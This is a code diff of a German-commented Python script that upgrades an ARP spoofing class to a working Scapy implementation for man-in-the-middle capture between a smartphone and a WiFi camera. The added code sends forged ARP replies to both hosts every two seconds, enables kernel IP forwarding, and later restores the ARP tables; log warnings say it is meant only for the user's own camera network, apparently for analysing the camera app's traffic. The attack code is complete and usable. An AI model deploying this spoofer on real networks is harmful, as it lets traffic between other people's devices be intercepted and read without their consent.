@@ -23,6 +23,12 @@ import time
 import threading
 import signal
 
+try:
+    from scapy.all import ARP, Ether, send, srp
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
 # Importiere config aus parent directory
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
 import config
@@ -43,9 +49,18 @@ class ARPSpoofer:
     """
     ARP Spoofing für Man-in-the-Middle Packet Capture
     Leitet Traffic zwischen Target (Smartphone) und Gateway (Kamera) über diesen Host um
+    
+    Verwendet Scapy für echtes ARP Spoofing!
     """
     
     def __init__(self, target_ip, gateway_ip, interface='wlan0'):
+        if not SCAPY_AVAILABLE:
+            raise ImportError(
+                "Scapy ist nicht installiert!\n"
+                "Installiere es mit: sudo apt-get install python3-scapy\n"
+                "Oder: sudo pip3 install scapy"
+            )
+        
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
@@ -53,144 +68,211 @@ class ARPSpoofer:
         self.thread = None
         self.target_mac = None
         self.gateway_mac = None
+        self.own_mac = None
         
     def _get_mac(self, ip):
-        """Ermittle MAC-Adresse für IP via ARP"""
+        """Ermittle MAC-Adresse für IP via ARP mit Scapy"""
         try:
-            # Sende ARP Request
-            result = subprocess.run(
-                ['arp', '-n', ip],
-                capture_output=True,
-                text=True,
-                timeout=5
+            logger.debug(f"Sende ARP Request an {ip}...")
+            # Sende ARP Request mit scapy
+            ans, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), 
+                timeout=3, 
+                verbose=False,
+                iface=self.interface,
+                retry=2
             )
             
-            # Parse ARP Tabelle
-            lines = result.stdout.split('\n')
-            for line in lines:
-                if ip in line:
-                    parts = line.split()
-                    if len(parts) >= 3:
-                        mac = parts[2]
-                        if ':' in mac:
-                            return mac
-            
-            # Falls nicht in ARP Tabelle, ping senden
-            subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
-                         stdout=subprocess.DEVNULL, 
-                         stderr=subprocess.DEVNULL)
-            time.sleep(0.5)
-            
-            # Nochmal versuchen
-            result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
-            lines = result.stdout.split('\n')
-            for line in lines:
-                if ip in line:
-                    parts = line.split()
-                    if len(parts) >= 3:
-                        mac = parts[2]
-                        if ':' in mac:
-                            return mac
-                            
+            if ans:
+                mac = ans[0][1].hwsrc
+                logger.debug(f"MAC für {ip}: {mac}")
+                return mac
+            else:
+                logger.debug(f"Keine Antwort von {ip}")
+                
         except Exception as e:
             logger.error(f"Fehler beim Ermitteln der MAC-Adresse für {ip}: {e}")
         
         return None
     
-    def _enable_ip_forwarding(self):
-        """Aktiviert IP Forwarding"""
+    def _get_own_mac(self):
+        """Ermittle eigene MAC-Adresse des Interface"""
         try:
-            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write('1\n')
-            logger.info("IP Forwarding aktiviert")
+            result = subprocess.run(
+                ['cat', f'/sys/class/net/{self.interface}/address'],
+                capture_output=True,
+                text=True,
+                check=True
+            )
+            mac = result.stdout.strip()
+            logger.debug(f"Eigene MAC ({self.interface}): {mac}")
+            return mac
+        except Exception as e:
+            logger.error(f"Fehler beim Ermitteln der eigenen MAC: {e}")
+            return None
+    
+    def _enable_ip_forwarding(self):
+        """Aktiviert IP Forwarding im Kernel"""
+        try:
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                check=True
+            )
+            logger.info("✓ IP Forwarding aktiviert")
         except Exception as e:
             logger.error(f"Fehler beim Aktivieren von IP Forwarding: {e}")
     
     def _disable_ip_forwarding(self):
-        """Deaktiviert IP Forwarding"""
+        """Deaktiviert IP Forwarding im Kernel"""
         try:
-            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write('0\n')
-            logger.info("IP Forwarding deaktiviert")
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=0'],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                check=True
+            )
+            logger.info("✓ IP Forwarding deaktiviert")
         except Exception as e:
             logger.error(f"Fehler beim Deaktivieren von IP Forwarding: {e}")
     
-    def _send_arp_spoof(self, target_ip, target_mac, spoof_ip):
-        """Sendet ein gefälschtes ARP-Paket"""
-        try:
-            # Baue ARP-Paket mit scapy-ähnlicher Struktur
-            # Verwende arping für einfache Implementierung
-            subprocess.run(
-                ['arp', '-s', target_ip, target_mac],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-        except:
-            pass
-    
     def _spoof_loop(self):
-        """Hauptloop für ARP Spoofing"""
-        logger.info("ARP Spoofing gestartet...")
+        """Hauptloop für ARP Spoofing - Sendet echte ARP-Pakete"""
+        logger.info("ARP Spoofing Loop gestartet...")
+        packet_count = 0
         
         while self.running:
             try:
-                # Installiere arping falls nicht vorhanden
-                # Target glauben lassen, wir sind das Gateway
-                subprocess.run(
-                    ['arp', '-s', self.target_ip, self.target_mac],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    timeout=1
-                )
+                # KRITISCH: Sende gefälschte ARP Reply Pakete
                 
-                # Gateway glauben lassen, wir sind das Target  
-                subprocess.run(
-                    ['arp', '-s', self.gateway_ip, self.gateway_mac],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    timeout=1
+                # 1. An Target (Smartphone): "Ich bin die Kamera"
+                # op=2 = ARP Reply (is-at)
+                # hwsrc = Unsere MAC (täuschen vor, Kamera zu sein)
+                # psrc = Kamera IP (täuschen vor, Kamera zu sein)
+                # hwdst = Smartphone MAC
+                # pdst = Smartphone IP
+                arp_to_target = ARP(
+                    op=2,  # ARP Reply
+                    hwsrc=self.own_mac,      # Unsere MAC
+                    psrc=self.gateway_ip,    # Täusche Kamera-IP vor
+                    hwdst=self.target_mac,   # Smartphone MAC
+                    pdst=self.target_ip      # Smartphone IP
                 )
+                send(arp_to_target, verbose=False, iface=self.interface)
                 
-                time.sleep(2)
+                # 2. An Gateway (Kamera): "Ich bin das Smartphone"
+                arp_to_gateway = ARP(
+                    op=2,  # ARP Reply
+                    hwsrc=self.own_mac,      # Unsere MAC
+                    psrc=self.target_ip,     # Täusche Smartphone-IP vor
+                    hwdst=self.gateway_mac,  # Kamera MAC
+                    pdst=self.gateway_ip     # Kamera IP
+                )
+                send(arp_to_gateway, verbose=False, iface=self.interface)
+                
+                packet_count += 2
+                if packet_count % 10 == 0:  # Alle 5 Zyklen loggen
+                    logger.debug(f"ARP Spoofing aktiv... ({packet_count} Pakete gesendet)")
+                
+                time.sleep(2)  # Alle 2 Sekunden spoofing packets senden
                 
             except Exception as e:
                 if self.running:
                     logger.error(f"Fehler im Spoof-Loop: {e}")
                 time.sleep(1)
+        
+        logger.info(f"ARP Spoofing Loop beendet ({packet_count} Pakete gesendet)")
+    
+    def _restore_arp(self):
+        """Stelle originale ARP-Einträge wieder her"""
+        logger.info("Stelle originale ARP-Tabellen wieder her...")
+        try:
+            # Sende korrekte ARP-Pakete (mehrmals für Zuverlässigkeit)
+            for i in range(3):
+                # Restore Target's ARP table: Echte Kamera-MAC
+                send(
+                    ARP(
+                        op=2,  # ARP Reply
+                        hwsrc=self.gateway_mac,  # Echte Kamera MAC
+                        psrc=self.gateway_ip,     # Kamera IP
+                        hwdst=self.target_mac,    # Smartphone MAC
+                        pdst=self.target_ip       # Smartphone IP
+                    ),
+                    verbose=False,
+                    iface=self.interface
+                )
+                
+                # Restore Gateway's ARP table: Echte Smartphone-MAC
+                send(
+                    ARP(
+                        op=2,  # ARP Reply
+                        hwsrc=self.target_mac,   # Echte Smartphone MAC
+                        psrc=self.target_ip,     # Smartphone IP
+                        hwdst=self.gateway_mac,  # Kamera MAC
+                        pdst=self.gateway_ip     # Kamera IP
+                    ),
+                    verbose=False,
+                    iface=self.interface
+                )
+                
+                logger.debug(f"Restore-Zyklus {i+1}/3 gesendet")
+                time.sleep(0.5)
+            
+            logger.info("✓ ARP-Tabellen wiederhergestellt")
+                
+        except Exception as e:
+            logger.error(f"Fehler beim Wiederherstellen: {e}")
     
     def start(self):
         """Startet ARP Spoofing"""
         logger.warning("="*80)
-        logger.warning("WARNUNG: ARP SPOOFING AKTIVIERT (MAN-IN-THE-MIDDLE)")
+        logger.warning("⚠️  WARNUNG: ARP SPOOFING AKTIVIERT (MAN-IN-THE-MIDDLE) ⚠️")
         logger.warning("Nur in eigenen Netzwerken verwenden!")
         logger.warning("Das Kamera-WLAN ist dein eigenes Netzwerk.")
         logger.warning("="*80)
         
-        # Ermittle MAC-Adressen
-        logger.info(f"Ermittle MAC-Adresse für Target: {self.target_ip}...")
+        # Ermittle eigene MAC
+        logger.info("Ermittle eigene MAC-Adresse...")
+        self.own_mac = self._get_own_mac()
+        if not self.own_mac:
+            logger.error("❌ Konnte eigene MAC-Adresse nicht ermitteln!")
+            return False
+        logger.info(f"✓ Eigene MAC: {self.own_mac}")
+        
+        # Ermittle Target MAC
+        logger.info(f"Ermittle MAC-Adresse für Target (Smartphone): {self.target_ip}...")
         self.target_mac = self._get_mac(self.target_ip)
         if not self.target_mac:
-            logger.error(f"Konnte MAC-Adresse für {self.target_ip} nicht ermitteln!")
-            logger.error("Stelle sicher, dass das Smartphone mit dem Netzwerk verbunden ist.")
+            logger.error(f"❌ Konnte MAC-Adresse für {self.target_ip} nicht ermitteln!")
+            logger.error("   Stelle sicher, dass das Smartphone mit dem Netzwerk verbunden ist.")
+            logger.error("   Prüfe mit: sudo python3 tests/udp_sniffer.py --scan")
             return False
-        logger.info(f"Target MAC: {self.target_mac}")
+        logger.info(f"✓ Target MAC: {self.target_mac}")
         
-        logger.info(f"Ermittle MAC-Adresse für Gateway: {self.gateway_ip}...")
+        # Ermittle Gateway MAC
+        logger.info(f"Ermittle MAC-Adresse für Gateway (Kamera): {self.gateway_ip}...")
         self.gateway_mac = self._get_mac(self.gateway_ip)
         if not self.gateway_mac:
-            logger.error(f"Konnte MAC-Adresse für {self.gateway_ip} nicht ermitteln!")
+            logger.error(f"❌ Konnte MAC-Adresse für {self.gateway_ip} nicht ermitteln!")
             return False
-        logger.info(f"Gateway MAC: {self.gateway_mac}")
+        logger.info(f"✓ Gateway MAC: {self.gateway_mac}")
         
         # Aktiviere IP Forwarding
+        logger.info("Aktiviere IP Forwarding...")
         self._enable_ip_forwarding()
         
         # Starte Spoofing Thread
+        logger.info("Starte ARP Spoofing Thread...")
         self.running = True
         self.thread = threading.Thread(target=self._spoof_loop, daemon=True)
         self.thread.start()
         
-        logger.info("ARP Spoofing aktiv - Traffic wird umgeleitet")
+        logger.info("="*80)
+        logger.info("✓ ARP Spoofing AKTIV - Traffic wird umgeleitet")
+        logger.info(f"  Smartphone ({self.target_ip}) → glaubt wir sind Kamera ({self.gateway_ip})")
+        logger.info(f"  Kamera ({self.gateway_ip}) → glaubt wir sind Smartphone ({self.target_ip})")
+        logger.info("="*80)
         return True
     
     def stop(self):
@@ -202,20 +284,12 @@ class ARPSpoofer:
             self.thread.join(timeout=3)
         
         # Stelle originale ARP-Einträge wieder her
-        logger.info("Stelle originale ARP-Tabellen wieder her...")
-        try:
-            # Lösche manipulierte ARP-Einträge
-            subprocess.run(['arp', '-d', self.target_ip], 
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run(['arp', '-d', self.gateway_ip], 
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            pass
+        self._restore_arp()
         
         # Deaktiviere IP Forwarding
         self._disable_ip_forwarding()
         
-        logger.info("ARP Spoofing gestoppt")
+        logger.info("✓ ARP Spoofing gestoppt")
 
 
 class WiFiConnector:
@@ -568,6 +642,13 @@ def main():
         logger.error("Dieses Script benötigt Root-Rechte. Bitte mit 'sudo' ausführen.")
         sys.exit(1)
     
+    # Check scapy für MITM-Modus
+    if args.mitm and not SCAPY_AVAILABLE:
+        logger.error("MITM-Modus benötigt Scapy!")
+        logger.error("Installiere mit: sudo apt-get install python3-scapy")
+        logger.error("Oder: sudo pip3 install scapy")
+        sys.exit(1)
+    
     # Signal Handler registrieren
     signal.signal(signal.SIGINT, cleanup_handler)
     
@@ -626,11 +707,15 @@ def main():
                 sys.exit(1)
         
         # Starte ARP Spoofing
-        arp_spoofer = ARPSpoofer(
-            target_ip=target_ip,
-            gateway_ip=args.camera_ip,
-            interface=args.interface
-        )
+        try:
+            arp_spoofer = ARPSpoofer(
+                target_ip=target_ip,
+                gateway_ip=args.camera_ip,
+                interface=args.interface
+            )
+        except ImportError as e:
+            logger.error(str(e))
+            sys.exit(1)
         
         if not arp_spoofer.start():
             logger.error("ARP Spoofing konnte nicht gestartet werden!")
